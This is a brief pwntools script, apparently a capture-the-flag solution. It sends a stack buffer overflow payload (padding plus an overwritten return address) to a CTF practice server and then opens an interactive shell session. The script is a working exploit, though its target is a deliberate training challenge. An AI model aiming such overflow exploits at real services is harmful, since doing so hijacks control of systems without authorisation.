from pwn import *

junk = "A" * 0x30
#address = "\x96\x05\x40\x00\x00\x00\x00"
payload = junk + p64(0x400751)

# Io = zio.zio("./level0")
Io = remote(("pwn2.jarvisoj.com", 9881))

Io.send(payload)
Io.interactive()
